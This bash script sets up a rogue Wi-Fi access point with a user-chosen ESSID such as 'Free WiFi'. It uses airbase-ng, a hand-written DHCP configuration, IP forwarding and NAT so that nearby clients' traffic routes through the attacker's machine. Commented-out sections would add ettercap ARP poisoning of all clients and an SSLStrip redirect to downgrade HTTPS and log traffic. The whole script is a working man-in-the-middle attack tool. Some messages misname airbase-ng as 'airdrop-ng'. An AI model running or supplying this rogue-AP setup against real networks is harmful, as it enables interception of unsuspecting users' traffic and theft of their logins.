#!/bin/bash

echo "PRE-REQUISITES"
echo "=============="
echo "- External interface configured and communicating."
echo "- Wireless card connected but NOT configured."
echo "- No interfaces on the 192.168.3.0/24 network."
echo " "

LOGDIR="$(date +%F-%H%M)"
mkdir $LOGDIR
cd $LOGDIR

# get vars from user
echo 'Network Interfaces:'
ifconfig | grep 'Link\|addr'
echo -n "Enter the name of the interface connected to the internet, for example eth0: "
read -e IFACE
airmon-ng
echo -n "Enter your wireless interface name, for example wlan0: "
read -e WIFACE
echo -n "Enter the ESSID you would like your rogue AP to be called, for example Free WiFi: "
read -e ESSID
echo -n "Enter the channel you would like your rogue AP to communicate on [1-11]: "
read -e CHANNEL

# start WAP
airmon-ng start $WIFACE
#modprobe tun
airbase-ng --essid "$ESSID" -c $CHANNEL -v mon0 > airbase.log &
xterm -bg black -fg yellow -T Airbase-NG -e tail -f airbase.log  &
sleep 5
echo "Configuring interface created by airdrop-ng"
ifconfig at0 192.168.3.1 netmask 255.255.255.0 up
#ifconfig at0 mtu 1400
echo "1" > /proc/sys/net/ipv4/ip_forward
route add -net 192.168.3.0 netmask 255.255.255.0 gw 192.168.3.1
echo 'Setting up iptables to handle traffic seen by the airdrop-ng (at0) interface'
#iptables -P FORWARD ACCEPT
iptables -t nat -A POSTROUTING -j MASQUERADE

# start DHCP server
echo "Creating a dhcpd.conf to assign addresses to clients that connect to us"
echo "default-lease-time 600;" > dhcpd.conf
echo "max-lease-time 720;"  >> dhcpd.conf
echo "ddns-update-style none;" >> dhcpd.conf
echo "authoritative;"  >> dhcpd.conf
echo "log-facility local7;"  >> dhcpd.conf
echo "subnet 192.168.3.0 netmask 255.255.255.0 {"  >> dhcpd.conf
echo "range 192.168.3.100 192.168.3.150;"  >> dhcpd.conf
echo "option routers 192.168.3.1;"  >> dhcpd.conf
echo "option domain-name-servers 8.8.8.8;"  >> dhcpd.conf
echo "}"  >> dhcpd.conf
echo 'DHCP server starting on our airdrop-ng interface (at0)'
dhcpd3 -q -cf dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid at0 &
echo "Launching DMESG"
xterm -bg black -fg red -T "System Logs" -e tail -f /var/log/messages &

#echo "Launching ettercap, poisoning all hosts on the at0 interface's subnet"
#xterm -bg black -fg blue -e ettercap -T -q -p -l ettercap.log -i at0 // // &

#echo "Launching SSLStrip log"
#iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
#python /pentest/web/sslstrip/sslstrip.py -p &> /dev/null &
#sleep 5
#xterm -bg black -fg blue -T "SSLStrip Log" -e tail -f sslstrip.log &

echo "Done."
